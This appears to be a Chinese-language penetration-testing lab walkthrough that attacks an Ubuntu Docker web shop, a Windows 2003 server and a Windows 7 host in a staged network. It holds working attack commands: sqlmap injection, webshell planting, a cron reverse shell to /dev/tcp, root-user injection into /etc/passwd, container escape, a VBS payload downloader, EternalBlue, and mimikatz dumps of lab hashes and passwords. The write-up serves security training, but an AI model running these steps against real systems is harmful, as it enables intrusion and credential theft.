# 靶场环境

<img src=".\图片\Snipaste_2023-05-20_12-08-26.png" alt="Snipaste_2023-05-20_12-08-26" style="zoom:80%;" />

老样子依然不配置 frp ，虚拟机 nat 改桥接 

# 第一台ubuntu

目标为 ip 192.168.0.102

配置 docker

```bash
docker run -it -d -p80:80 --privileged=true yhj
```

补充：假设我们做了 frp 配置了 80 端口反向代理到 vps 的 80 端口，所以渗透的思路就只有 80 端口，所以就不扫描了

## 信息搜集

1、80 端口网站信息

<img src=".\图片\Snipaste_2023-05-20_12-25-51.png" alt="Snipaste_2023-05-20_12-25-51" style="zoom:80%;" />

2、web上下文枚举

```bash
└─# nikto -host 192.168.0.102
+ Server: Apache/2.4.10 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /module/: Directory indexing found.
+ /robots.txt: Entry '/module/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /admin/: Directory indexing found.
+ /robots.txt: Entry '/admin/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/common.php' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /hook/: Directory indexing found.
+ /robots.txt: Entry '/hook/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /public/: Directory indexing found.
+ /robots.txt: Entry '/public/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/config.php' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /template/: Directory indexing found.
+ /robots.txt: Entry '/template/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /data/: Directory indexing found.
+ /robots.txt: Entry '/data/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: contains 9 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+ Multiple index files found (note: these may not all be unique): /index.cfm, /index.xml, /index.jsp, /index.cgi, /index.aspx, /index.php, /index.pl, /default.asp, /default.htm, /index.html, /default.aspx, /index.htm, /index.jhtml, /index.do, /index.shtml, /index.asp.
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /phpinfo.php: Output from the phpinfo() function was found.
+ /config.php: PHP Config file may contain database IDs and passwords.
+ /admin/: This might be interesting.
+ /cart/: This might be interesting.
+ /data/: This might be interesting.
+ /install/: This might be interesting.
+ /public/: This might be interesting.
+ /template/: This might be interesting: could have sensitive files or system information.
+ /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: CWE-552
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
```

暂时找到一些web上下文路径，但当我想详细使用工具扫描时却提示失败了

```bash
└─# gobuster dir -u http://192.168.0.102 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak
```

3、查看重要信息 robots.txt

<img src=".\图片\Snipaste_2023-05-20_16-04-15.png" alt="Snipaste_2023-05-20_16-04-15" style="zoom:80%;" />

4、找到后台登录地址

```http
http://192.168.0.102/admin/webadmin.php?mod=do&act=login
```

<img src=".\图片\Snipaste_2023-05-20_16-05-24.png" alt="Snipaste_2023-05-20_16-05-24" style="zoom:80%;" />

顺便发现这里的验证码可重用，且 cms 为 【逍遥商城管理系统】

5、未找到该cms的版本是多少（猜测为 v1.1），但是找到了几篇文章，与 cnvd 里的一些信息

```http
https://www.freebuf.com/vuls/282110.html
```

```http
https://www.jianshu.com/p/d5a180ebeb7e
```

<img src=".\图片\Snipaste_2023-05-20_16-38-11.png" alt="Snipaste_2023-05-20_16-38-11" style="zoom:80%;" />

## 源码审计登录后台

全网找 【逍遥B2C商城】 源码

### 1、路由的关系

拿到一套新源码，要观察网站的 URL 情况，与对应的源码哪里可以对应上，从而分析推断出路由与文件的关系

请求：

```http
http://192.168.0.101:8066/user.php?mod=do&act=login
```

<img src=".\图片\Snipaste_2023-05-20_17-14-56.png" alt="Snipaste_2023-05-20_17-14-56" style="zoom:50%;" />

对应的文件在 `module/mobile_user/do.php` 里，请求的正是 do.php 里的 login() 方法

<img src=".\图片\Snipaste_2023-05-20_17-17-29.png" alt="Snipaste_2023-05-20_17-17-29" style="zoom:67%;" />

### 2、sql 注入

可以用 Seay 先自动审计，或者配合 CNVD 挖 1day，再或者配合网上的文章复现

<img src=".\图片\Snipaste_2023-05-20_17-26-00.png" alt="Snipaste_2023-05-20_17-26-00" style="zoom:50%;" />

#### 步骤

在 `module/mobile_user/back.php` 里 参数 `$_REQUEST['order_id']` 是拼接到 sql 语句里执行的

<img src=".\图片\Snipaste_2023-05-20_17-29-25.png" alt="Snipaste_2023-05-20_17-29-25" style="zoom:67%;" />

部分源码如下：

```php
switch ($act) {
......
case 'dohuishou': 	 
    	$order_id = trim( $_REQUEST['order_id'] );    
    	$order = $db2->getRow('select * from xy_order where order_id="'.$order_id.'"');
```

于是尝试触发，注意 `mobile_user` 这个目录是配合手机端实现的，大概率是根据浏览器的 UA 头判断的，先姑且找个手机端的 UA 头：

```
Mozilla/5.0 (Android 11; Mobile; rv:83.0) Gecko/83.0 Firefox/83.0
```

这个需要普通用户登录后才能触发，于是先注册一个用户，再抓包尝试，触发 

```http
http://192.168.0.101:8066/user.php?mod=back&act=dohuishou&order_id=1
```

<img src=".\图片\Snipaste_2023-05-20_17-58-48.png" alt="Snipaste_2023-05-20_17-58-48" style="zoom:80%;" />

接着把数据包放入 sql_inject.txt 里用 sqlmap 跑

```bash
python sqlmap.py -r sql_inject.txt --dbms mysql --dbs
```

<img src=".\图片\Snipaste_2023-05-20_18-02-43.png" alt="Snipaste_2023-05-20_18-02-43" style="zoom:67%;" />

补充一下：如果不利用工具想一步步自己调试，可以本地开启 sql 语句监控、输出打印 sql 等方法手工注入

### sql注入利用

以上测试是在本地环境里做的，现在再实际靶场里测试

```bash
python sqlmap.py -r sql_inject.txt --dbms mysql --dbs
```

<img src=".\图片\Snipaste_2023-05-20_18-07-42.png" alt="Snipaste_2023-05-20_18-07-42" style="zoom:67%;" />

```bash
python sqlmap.py -r sql_inject.txt --dbms mysql --dbs --dump -T xy_admin -D yhj
```

<img src=".\图片\Snipaste_2023-05-20_18-10-39.png" alt="Snipaste_2023-05-20_18-10-39" style="zoom:80%;" />

```
5c771656e96f876293411b10dc90dc4d  MD5解密为  nasa123
```

于是用   `admin:nasa123` 可登录后台

## 爆破登录后台

利用后台验证码可重用的漏洞，社工在线生成特定字典，输入关键字：【nasa】、【moonsec】、【moon】等等关键词

利用网站：

```http
https://www.ddosi.org/pass8/
https://api.xiaobaibk.com/lab/guess/
```

然后利用 burp 或者自写脚本爆破后台，也可以得到密码

```
admin:nasa123
```

<img src=".\图片\Snipaste_2023-05-20_18-23-24.png" alt="Snipaste_2023-05-20_18-23-24" style="zoom:80%;" />

## 后台getshell

利用任意文件删除配合网站重装的组合拳，getshell

没删除前：

<img src=".\图片\Snipaste_2023-05-20_18-46-00.png" alt="Snipaste_2023-05-20_18-46-00" style="zoom: 67%;" />

这里就直接找到文章然后漏洞利用了

```http
https://www.jianshu.com/p/d5a180ebeb7e
```

1、删除 `install.lock`  文件

还是可以先本地测试再用于靶场

触发如下：

点击数据库备份的删除按钮抓包

<img src=".\图片\Snipaste_2023-05-20_19-00-05.png" alt="Snipaste_2023-05-20_19-00-05" style="zoom:67%;" />

修改dbname参数

```
dbname=../../install/install.lock
```

```http
http://192.168.0.102/admin/webadmin.php?mod=db&act=del&dbname=../../install/install.lock&token=317b32ffc49ce760f944230161e31540
```

<img src=".\图片\Snipaste_2023-05-20_19-01-54.png" alt="Snipaste_2023-05-20_19-01-54" style="zoom:67%;" />

另外，pe_token 的值在右键源码里也能找到

<img src=".\图片\Snipaste_2023-05-20_19-01-15.png" alt="Snipaste_2023-05-20_19-01-15" style="zoom:80%;" />

2、重装配合修改 config.php 写入shell

<img src=".\图片\Snipaste_2023-05-20_19-06-09.png" alt="Snipaste_2023-05-20_19-06-09" style="zoom:67%;" />

<img src=".\图片\Snipaste_2023-05-20_19-07-06.png" alt="Snipaste_2023-05-20_19-07-06" style="zoom:67%;" />

3、哥斯拉连接

<img src=".\图片\Snipaste_2023-05-20_19-09-13.png" alt="Snipaste_2023-05-20_19-09-13" style="zoom:67%;" />

1、哥斯拉弹到 msf 开启  python 交互 shell

<img src=".\图片\Snipaste_2023-05-20_19-31-18.png" alt="Snipaste_2023-05-20_19-31-18" style="zoom:67%;" />

## suid提权

root用户赋予find 的suid权限的命令

```bash
chmod u+s /usr/bin/find
```

查看 有s位的可执行文件

```bash
find / -perm -u=s -type f 2>/dev/null
```

有 find 提权

<img src=".\图片\Snipaste_2023-05-20_19-54-10.png" alt="Snipaste_2023-05-20_19-54-10" style="zoom:80%;" />

```
touch getshell
find / -type f -name getshell -exec "whoami" \;
find / -type f -name getshell -exec "/bin/sh" \;
```

<img src=".\图片\Snipaste_2023-05-20_19-59-03.png" alt="Snipaste_2023-05-20_19-59-03" style="zoom: 80%;" />

其它find提权方法请参考：

```http
https://blog.csdn.net/crisprx/article/details/104110725
```

其它suid提权参考：

```http
https://www.freebuf.com/articles/web/288129.html
```

## docker逃逸

### 判断docker

```bash
ls -alh /.dockerenv
-rwxr-xr-x 1 root root 0 May 20 07:44 /.dockerenv
```

### 步骤

#### docker内增加root权限用户

本地kali生成账号密码：

```bash
openssl passwd -1 -salt zf1yolo 123456
```

```
$1$zf1yolo$oULk89mtehUjxLPH9cRSn1
```

仿造root来修改

```
root:x:0:0:root:/root:/bin/bash
```

追加到 passswd 以下内容：

```
zf1yolo:$1$zf1yolo$oULk89mtehUjxLPH9cRSn1:0:0:root:/root:/bin/bash
```

```bash
echo 'zf1yolo:$1$zf1yolo$oULk89mtehUjxLPH9cRSn1:0:0:root:/root:/bin/bash' >> /etc/passwd
```

su 到刚添加的 zf1yolo 用户：

<img src=".\图片\Snipaste_2023-05-20_20-07-06.png" alt="Snipaste_2023-05-20_20-07-06" style="zoom:80%;" />

#### 挂载目录逃逸

现在还是处于容器内，所以还要进行提权到宿主上。在docker如果启动的时候 `--privileged=true` 是可以逃逸的。 

挂载宿主硬盘到 test 目录：

```
创建目录
mkdir /test
将宿主的目录挂载到test目录
mount /dev/sda1 /test
改变根目录为 /test
chroot /test
接下来就相当于逃逸了出来，可以操作一切真实目录里的内容，况且当前还是root权限
```

<img src=".\图片\Snipaste_2023-05-20_20-13-10.png" alt="Snipaste_2023-05-20_20-13-10" style="zoom:80%;" />

#### 后续反弹shell

计划任务反弹shell

```bash
echo '/bin/bash -i >& bash -i >&/dev/tcp/192.168.0.103/3322 0>&1' > /tmp/sec.sh
chmod +x /tmp/sec.sh
cat /tmp/sec.sh
echo '*/1 * * * * root bash /tmp/sec.sh' >>/etc/crontab
```

kali 收到 shell：

<img src=".\图片\Snipaste_2023-05-20_20-21-18.png" alt="Snipaste_2023-05-20_20-21-18" style="zoom:80%;" />

补充：

```
解决命令 'ifconfig' 
可在 '/sbin/ifconfig' 处找到，由于/sbin 不在PATH 环境变量中，故无法找到该命令。 这很可能是由您的用户账户没有管理员权限造成的。

ifconfig：未找到命令

方法：
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/us r/local/games:/snap/bin
```

# 第二台win2003

## 前置说明

本来应该在之前的 ubuntu 的 shell 里对 win2003 做信息搜集的，但是我不做了，直接在 kali 上渗透 win2003

win2003的网卡信息如下，一个出网一个内网 

<img src=".\图片\Snipaste_2023-05-20_21-16-23.png" alt="Snipaste_2023-05-20_21-16-23"  />

## 信息搜集

1、 fscan 扫描内网

本来改在 ubuntu 里执行的，但是图方便在 kali 里执行

```http
https://github.com/shadow1ng/fscan/
```

```bash
./fscan_amd64 -h 192.168.0.0/24 -np -no -nopoc
```

发现 192.168.0.104 为目标机

2、fscan 详细扫 win2003

```bahs
└─# ./fscan_amd64 -h 192.168.0.104 -np -no -nopoc                      

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.6.3
start infoscan
192.168.0.104:139 open
192.168.0.104:135 open
192.168.0.104:80 open
192.168.0.104:445 open
alive ports len is: 4
start vulscan
NetInfo:
[*]192.168.0.104
   [->]win2003
   [->]10.10.1.131
   [->]192.168.0.104
[+] 192.168.0.104       MS17-010        (Windows Server 2003 3790 Service Pack 2)
[*] 192.168.0.104        __MSBROWSE__\WIN2003           Windows Server 2003 3790 Service Pack 2
[*] WebTitle:http://192.168.0.104      code:200 len:1193   title:None
```

可以看到有永恒之蓝的可能

3、查看 80 端口网站信息

```bash
└─# nikto -host 192.168.0.104                    
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.0.104
+ Target Hostname:    192.168.0.104
+ Target Port:        80
+ Start Time:         2023-05-20 09:28:50 (GMT-4)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/6.0
+ /: Retrieved x-powered-by header: ASP.NET.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
..................
.............
```

重要信息为服务器为 `Microsoft-IIS/6.0`

4、寻找 IIS6.0 的漏洞

<img src=".\图片\Snipaste_2023-05-20_21-38-55.png" alt="Snipaste_2023-05-20_21-38-55" style="zoom:80%;" />

## 漏洞利用

CVE-2017-7269

```
python2 II6.py 192.168.0.104 80 192.168.0.103 2238
```

<img src=".\图片\Snipaste_2023-05-20_21-47-56.png" alt="Snipaste_2023-05-20_21-47-56" style="zoom:80%;" />

## 提权

### 权限弹到msf

1、msf生成后门

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.103 lport=7777 -f exe -o 7777.exe
```

2、vbs下载后门

```
echo set a=createobject(^"adod^"+^"b.stream^"):set w=createobject(^"micro^"+^"soft.xmlhttp^"):w.open^"get^",wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 >> downfile.vbs
```

```
cscript downfile.vbs http://192.168.0.101:7766/7777.exe 7777.exe
```

3、CVE-2009-1535

```
iis6.0.exe 2.exe
```

## 后渗透信息搜集

### 抓取密码

载入  kiwi

```
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
```

1、`hashdump`

```meterpreter
meterpreter > hashdump
Administrator:500:6c634e36565f85fc9c5014ae4718a7ee:f099c4a637f9b871487bbb03962f79b5:::
ASPNET:1006:c5f4c32e080b1c0a19f45641a62db986:5643281884dd972acd9b0eaeecd13522:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
IUSR_WWW-79FA760B73D:1000:a1323e561696c32ad68862a8c0118e7e:00dd987a1d0c4540f919b3eb5fc0b1cd:::
IWAM_WWW-79FA760B73D:1001:123dec921ecc0ca82f1106015d8abba7:556f2d1b30d88fc35eb8c4d573a5cd14:::
SUPPORT_388945a0:1004:aad3b435b51404eeaad3b435b51404ee:f739006531fcc09af8615f9575fa943c:::
```

2、`kiwi_cmd sekurlsa::logonPasswords`

```meterpreter
meterpreter > kiwi_cmd sekurlsa::logonPasswords

Authentication Id : 0 ; 872256 (00000000:000d4f40)
Session           : NetworkCleartext from 0
User Name         : IUSR_WWW-79FA760B73D
Domain            : WIN2003
Logon Server      : WIN2003
Logon Time        : 2023-5-20 21:22:26
SID               : S-1-5-21-3636755759-1784588792-1154290278-1000
        msv :
         [00000002] Primary
         * Username : IUSR_WWW-79FA760B73D
         * Domain   : WIN2003
         * LM       : a1323e561696c32ad68862a8c0118e7e
         * NTLM     : 00dd987a1d0c4540f919b3eb5fc0b1cd
         * SHA1     : e667cef8b822d775d96b16d8d0fa13a9a6c5c2e6
        wdigest :
         * Username : IUSR_WWW-79FA760B73D
         * Domain   : WIN2003
         * Password : eadL:}Yl5COK6z
        kerberos :
         * Username : IUSR_WWW-79FA760B73D
         * Domain   : WIN2003
         * Password : eadL:}Yl5COK6z
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : NETWORK SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2022-1-14 13:07:43
SID               : S-1-5-20
        msv :
         [00000002] Primary
         * Username : WIN2003$
         * Domain   : WORKGROUP
         * LM       : aad3b435b51404eeaad3b435b51404ee
         * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
         * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
        wdigest :
         * Username : WIN2003$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : win2003$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 52026 (00000000:0000cb3a)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2022-1-14 13:07:43
SID               : 
        msv :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 157291 (00000000:0002666b)
Session           : Interactive from 0
User Name         : Administrator
Domain            : WIN2003
Logon Server      : WIN2003
Logon Time        : 2022-1-14 13:07:59
SID               : S-1-5-21-3636755759-1784588792-1154290278-500
        msv :
         [00000002] Primary
         * Username : Administrator
         * Domain   : WIN2003
         * LM       : 6c634e36565f85fc9c5014ae4718a7ee
         * NTLM     : f099c4a637f9b871487bbb03962f79b5
         * SHA1     : 4df4d4101487c8266ecc4b7174affa548cbd56c3
        wdigest :
         * Username : Administrator
         * Domain   : WIN2003
         * Password : admin555
        kerberos :
         * Username : Administrator
         * Domain   : WIN2003
         * Password : admin555
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2022-1-14 13:07:43
SID               : S-1-5-19
        msv :
        wdigest :
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WIN2003$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 2022-1-14 13:07:43
SID               : S-1-5-18
        msv :
        wdigest :
        kerberos :
         * Username : win2003$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :
```

查看到win2003账号密码为  `Administrator:admin555`

### 查看网段

```meterpreter
meterpreter > getuid
Server username: WIN2003\Administrator                                                                                                                                                
meterpreter > ipconfig                                                                                                                                         
IPv4 Address : 10.10.1.131                                                                                    ..........................                                                                                   IPv4 Address : 192.168.0.104
..............
```

特别补充：因为手动原因靶场网卡变化 ip 变化了，以上的 10.10.1.0/24 网段 就和 以下 10.10.10.0/24 网段一样

### 网段主机发现

nbtscan 扫网段

```
nbtscan.exe -r 10.10.10.0/24

Doing NBT name scan for addresses from 10.10.10.0/24

IP address       NetBIOS Name     Server    User             MAC address
------------------------------------------------------------------------------
10.10.10.142     WIN7             <server>  <unknown>        00-0c-29-e8-44-f8
10.10.10.143     AD02             <server>  <unknown>        00-0c-29-0a-59-e5
10.10.10.140     AD01             <server>  <unknown>        00-0c-29-07-8b-09
```

```
Cnbtscan.exe  192.168.0.0/24

Doing NBT name scan for addresses from 192.168.0.0/24

IP address       NetBIOS Name     Server    User             MAC address
------------------------------------------------------------------------------
192.168.0.101    FUCKYOU          <server>  <unknown>        b0-a4-60-02-b6-60
192.168.0.102    WIN7             <server>  <unknown>        00-0c-29-e8-44-02
```

发现 win7 有两张网卡，一张出网一张内网

# 第三台win7

## 前置

之前在 win2003 里信息搜集，发现 win7 有两张网卡，一张出网一张内网

## 方法一

kali 直接上永恒之蓝

1、namp扫描win7

```bash
└─# nmap -A -sV 192.168.0.102  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-21 01:25 EDT
Nmap scan report for 192.168.0.102 (192.168.0.102)
Host is up (0.00076s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: NASA)
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 00:0C:29:E8:44:02 (VMware)
Device type: general purpose
Running: Microsoft Windows 7|2008|8.1
OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1
Network Distance: 1 hop
Service Info: Host: WIN7; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: win7
|   NetBIOS computer name: WIN7\x00
|   Domain name: nasa.gov
|   Forest name: nasa.gov
|   FQDN: win7.nasa.gov
|_  System time: 2023-05-21T13:26:51+08:00
|_nbstat: NetBIOS name: WIN7, NetBIOS user: <unknown>, NetBIOS MAC: 000c29e84402 (VMware)
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-05-21T05:26:51
|_  start_date: 2022-01-11T07:58:25
|_clock-skew: mean: -2h40m00s, deviation: 4h37m07s, median: 0s
```

2、msf 直接上

```msf
msf6 > search ms17-010

msf6 exploit(multi/handler) > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 192.168.0.102
rhosts => 192.168.0.102
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 192.168.0.103
lhost => 192.168.0.103
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lport 1234
lport => 1234
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit 
```

<img src=".\图片\Snipaste_2023-05-21_13-37-04.png" alt="Snipaste_2023-05-21_13-37-04"  />

自动迁移进程

```
meterpreter > run post/windows/manage/migrate
```

## 方法二

smb 用户爆破

1、把netbios name设置用户列表 使用smb 登录模块进行批量弱口令测试

用户列表：

```
administrator
WIN2003
AD01
AD02
WIN7
```

win2003 里抓取的密码： admin555，或者放弱口令字典

msf 里：

```
msf6 > use scanner/smb/smb_login
```

<img src=".\图片\Snipaste_2023-05-21_13-40-29.png" alt="Snipaste_2023-05-21_13-40-29" style="zoom:80%;" />

2、 ms17_010_psexec 登录

```
use windows/smb/ms17_010_psexec
set payload windows/meterpreter/bind_tcp
set smbuser win7
set smbpass admin555
run
```

## win7主机信息收集

1、密码抓取

```
meterpreter > load kiwi
```

```
meterpreter > kiwi_cmd sekurlsa::logonPasswords

Authentication Id : 0 ; 1056343 (00000000:00101e57)
Session           : Interactive from 1
User Name         : test
Domain            : NASA
Logon Server      : AD01
Logon Time        : 2022/1/11 16:11:04
SID               : S-1-5-21-320502414-1314547354-1033589243-1134
        msv :
         [00000003] Primary
         * Username : test
         * Domain   : NASA
         * LM       : a071457d1ede2871a365438a9412e9f4
         * NTLM     : 59e3c9f97af3f257b02409bbf3b2da11
         * SHA1     : c4eb781da81b515f7d68f68044e97ac00e1d7085
        tspkg :
         * Username : test
         * Domain   : NASA
         * Password : QWEasd!@#999
        wdigest :
         * Username : test
         * Domain   : NASA
         * Password : QWEasd!@#999
        kerberos :
         * Username : test
         * Domain   : NASA.GOV
         * Password : QWEasd!@#999
        ssp :
        credman :

Authentication Id : 0 ; 867448 (00000000:000d3c78)
Session           : Interactive from 2
User Name         : win7
Domain            : WIN7
Logon Server      : WIN7
Logon Time        : 2022/1/11 16:10:04
SID               : S-1-5-21-1323724323-825390049-2571486981-1000
        msv :
         [00000003] Primary
         * Username : win7
         * Domain   : WIN7
         * LM       : 6c634e36565f85fc9c5014ae4718a7ee
         * NTLM     : f099c4a637f9b871487bbb03962f79b5
         * SHA1     : 4df4d4101487c8266ecc4b7174affa548cbd56c3
        tspkg :
         * Username : win7
         * Domain   : WIN7
         * Password : admin555
        wdigest :
         * Username : win7
         * Domain   : WIN7
         * Password : admin555
        kerberos :
         * Username : win7
         * Domain   : WIN7
         * Password : admin555
        ssp :
        credman :

Authentication Id : 0 ; 867417 (00000000:000d3c59)
Session           : Interactive from 2
User Name         : win7
Domain            : WIN7
Logon Server      : WIN7
Logon Time        : 2022/1/11 16:10:04
SID               : S-1-5-21-1323724323-825390049-2571486981-1000
        msv :
         [00000003] Primary
         * Username : win7
         * Domain   : WIN7
         * LM       : 6c634e36565f85fc9c5014ae4718a7ee
         * NTLM     : f099c4a637f9b871487bbb03962f79b5
         * SHA1     : 4df4d4101487c8266ecc4b7174affa548cbd56c3
        tspkg :
         * Username : win7
         * Domain   : WIN7
         * Password : admin555
        wdigest :
         * Username : win7
         * Domain   : WIN7
         * Password : admin555
        kerberos :
         * Username : win7
         * Domain   : WIN7
         * Password : admin555
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2022/1/11 15:58:24
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WIN7$
Domain            : NASA
Logon Server      : (null)
Logon Time        : 2022/1/11 15:58:24
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : WIN7$
         * Domain   : NASA
         * NTLM     : 0fbad63307672e68d157f15812c68f10
         * SHA1     : 22aced348f05f70a40d2177591b65f6ff61c8053
        tspkg :
        wdigest :
         * Username : WIN7$
         * Domain   : NASA
         * Password : *TWd&U<_HmU- 9O*'%$qBwkI?;("u $YVsgqo D'jUOR[b$<"d(4.nwOFf(UyUG.q7@c.xz+=KcHCr+,%F7>i?=((QLz8#:b/IXA@!Sc(gH:vdmopQmNfBzw
        kerberos :
         * Username : win7$
         * Domain   : NASA.GOV
         * Password : *TWd&U<_HmU- 9O*'%$qBwkI?;("u $YVsgqo D'jUOR[b$<"d(4.nwOFf(UyUG.q7@c.xz+=KcHCr+,%F7>i?=((QLz8#:b/IXA@!Sc(gH:vdmopQmNfBzw
        ssp :
        credman :

Authentication Id : 0 ; 52357 (00000000:0000cc85)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2022/1/11 15:58:24
SID               : 
        msv :
         [00000003] Primary
         * Username : WIN7$
         * Domain   : NASA
         * NTLM     : 0fbad63307672e68d157f15812c68f10
         * SHA1     : 22aced348f05f70a40d2177591b65f6ff61c8053
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WIN7$
Domain            : NASA
Logon Server      : (null)
Logon Time        : 2022/1/11 15:58:24
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : WIN7$
         * Domain   : NASA
         * Password : *TWd&U<_HmU- 9O*'%$qBwkI?;("u $YVsgqo D'jUOR[b$<"d(4.nwOFf(UyUG.q7@c.xz+=KcHCr+,%F7>i?=((QLz8#:b/IXA@!Sc(gH:vdmopQmNfBzw
        kerberos :
         * Username : win7$
         * Domain   : NASA.GOV
